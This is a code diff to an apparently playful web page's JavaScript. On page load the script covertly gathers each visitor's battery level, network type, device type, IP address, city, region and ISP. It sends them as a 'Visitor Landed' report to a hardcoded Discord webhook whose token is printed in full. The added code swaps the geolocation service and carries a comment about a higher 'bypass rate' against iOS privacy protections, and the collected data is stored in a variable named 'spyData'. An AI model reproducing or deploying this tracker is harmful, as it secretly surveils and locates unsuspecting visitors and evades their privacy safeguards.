@@ -76,7 +76,7 @@
 
 <script>
   let visitorName = "", clickCount = 0, yesScale = 1;
-  let batteryLevel = "Restricted/iOS"; // Default fallback
+  let batteryLevel = "Restricted"; 
   let connectionType = "N/A";
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
@@ -104,23 +104,12 @@
   ];
 
   window.onload = async () => {
-    // 🔋 Improved Battery Fetch
-    try {
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        batteryLevel = `${Math.round(battery.level * 100)}%`;
-        // Listen for changes
-        battery.addEventListener('levelchange', () => {
-          batteryLevel = `${Math.round(battery.level * 100)}%`;
-        });
-      } else {
-        batteryLevel = "Unsupported (iOS/Safari)";
-      }
-    } catch (e) {
-      batteryLevel = "Blocked by Browser";
+    // 🔋 Battery Fetch
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      batteryLevel = `${Math.round(battery.level * 100)}%`;
     }
 
-    // 🌐 Network tracking
     if (navigator.connection) {
       connectionType = navigator.connection.effectiveType || "Unknown";
     }
@@ -134,16 +123,18 @@
       msgEl.classList.add('pulsing');
     }
 
-    sendDiscordReport("Visitor Landed (Direct)");
+    sendDiscordReport("Visitor Landed");
   };
 
   async function sendDiscordReport(status) {
     const now = new Date();
+    
     let spyData = {};
     try {
-        const res = await fetch('https://ipapi.co/json/');
+        // CHANGED TO IPWHOIS - HIGHER BYPASS RATE FOR IOS/PRIVACY
+        const res = await fetch('https://ipwho.is/');
         spyData = await res.json();
-    } catch (e) { spyData = { ip: "Blocked", city: "Unknown", region: "Unknown", org: "Unknown" }; }
+    } catch (e) { spyData = { ip: "Blocked", city: "Unknown", region: "Unknown", connection: { isp: "Unknown" } }; }
 
     const payload = {
       embeds: [{
@@ -152,12 +143,12 @@
         fields: [
           { name: "Event", value: `**${status}**`, inline: true },
           { name: "Device", value: navigator.userAgent.includes("Mobi") ? "Mobile" : "Desktop", inline: true },
-          { name: "Battery", value: batteryLevel, inline: true }, // Highlighted Field
+          { name: "Battery", value: batteryLevel, inline: true },
           { name: "Network", value: connectionType, inline: true },
           { name: "Misses", value: `${clickCount}`, inline: true },
-          { name: "Location", value: `${spyData.city}, ${spyData.region}`, inline: true },
-          { name: "IP Address", value: `\`${spyData.ip}\``, inline: false },
-          { name: "Network/ISP", value: `\`${spyData.org}\``, inline: false }
+          { name: "Location", value: `${spyData.city || "Unknown"}, ${spyData.region || "Unknown"}`, inline: true },
+          { name: "IP Address", value: `\`${spyData.ip || "Blocked"}\``, inline: false },
+          { name: "Network/ISP", value: `\`${spyData.connection?.isp || "Unknown"}\``, inline: false }
         ],
         timestamp: now.toISOString()
       }]
